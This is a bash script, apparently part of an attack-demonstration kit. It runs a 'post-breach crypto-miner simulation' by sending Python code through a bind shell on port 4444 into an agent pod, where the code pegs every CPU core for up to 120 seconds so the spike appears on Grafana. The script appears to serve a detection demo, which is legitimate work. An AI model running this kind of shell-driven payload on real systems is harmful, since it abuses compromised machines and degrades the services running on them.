#!/usr/bin/env bash
# Sabotage: simulate a crypto-miner by maxing out CPU with Python processes.
# Creates visible CPU spike on Grafana dashboards.
set -euo pipefail

if [[ "${1:-}" == "--help" ]]; then
  echo "Usage: attack-miner.sh [--duration SECONDS]"
  echo "  Simulates a crypto-miner by spawning CPU-intensive Python processes."
  echo "  Creates a dramatic CPU spike visible on Grafana. Default: 30 seconds."
  echo ""
  echo "  Requires: bind shell open (run trigger.sh + wait-shell.sh first)"
  echo ""
  echo "Environment:"
  echo "  AGENT_NS     agent namespace (default: agent-namespace)"
  echo "  BIND_PORT    bind shell port (default: 4444)"
  exit 0
fi

DURATION=30
while [[ $# -gt 0 ]]; do
  case "$1" in
    --duration) DURATION="$2"; shift 2 ;;
    *) shift ;;
  esac
done

# Cap at 120s to avoid permanent damage
if (( DURATION > 120 )); then
  DURATION=120
  echo "  Duration capped at 120 seconds."
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/lib.sh"

banner "Post-Breach: Crypto-Miner Simulation"
echo "@PHASE Crypto-Miner"

PYTHON_CODE='
import multiprocessing, time, os, signal

duration = int('$DURATION')

print("@PHASE Spawn-Workers")
print("=" * 60)
print("  SABOTAGE: Crypto-Miner Simulation")
print("=" * 60)
cpu_count = multiprocessing.cpu_count()
print(f"  CPU cores:  {cpu_count}")
print(f"  Duration:   {duration}s")
print(f"  PID:        {os.getpid()}")
print(f"@FINDING high Spawning {cpu_count} CPU-intensive worker processes for {duration}s")
print()

def mine():
    end_time = time.time() + duration
    while time.time() < end_time:
        _ = 2 ** 1000000

workers = []
print(f"  Spawning {cpu_count} worker processes...")

for i in range(cpu_count):
    p = multiprocessing.Process(target=mine)
    p.start()
    workers.append(p)
    print(f"    Worker {i+1}/{cpu_count} started (PID {p.pid})")

print()
print(f"  Mining for {duration} seconds... (CPU should spike on Grafana)")
print()

# Wait for workers to finish
for p in workers:
    p.join()

print("@PHASE Complete")
print("  All workers finished.")
print(f"  CPU spike lasted {duration} seconds.")
print(f"@RESULT success Crypto-miner ran {cpu_count} workers for {duration}s")
print()
print("Crypto-miner simulation complete.")
'

echo "  Duration: ${DURATION}s"
echo "  Piping crypto-miner script to agent pod..."
echo ""
run_on_agent "$PYTHON_CODE"
echo ""
echo "Crypto-miner simulation complete."
